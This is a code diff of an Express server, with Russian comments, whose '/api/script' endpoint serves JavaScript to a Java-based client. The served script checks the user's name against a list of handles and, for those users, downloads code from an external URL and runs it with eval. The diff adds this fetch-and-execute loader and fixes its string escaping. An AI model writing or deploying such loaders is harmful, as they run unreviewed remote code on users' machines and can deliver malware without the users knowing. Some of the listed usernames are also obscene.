@@ -42,7 +42,7 @@ const validateRequest = (req, res, next) => {
 
 // ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================
 
-// Главный эндпоинт для скрипта
+// Главный эндпоинт для скрипта - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
     var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
@@ -50,19 +50,17 @@ app.get('/api/script', validateRequest, (req, res) => {
 // Проверяем разрешенные имена
 if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
     try {
-        // Выполняем внешний скрипт
+        // Выполняем внешний скрипт - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
         eval(new java.util.Scanner(
             new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91").openStream(), 
             "UTF-8"
-        ).useDelimiter("\\A").next());
+        ).useDelimiter("\\\\\\\\A").next());
     } catch (e) {
         java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
 } else {
-    print("X")
+    print("X");
 }
-
-})
 })();`;
     
     res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
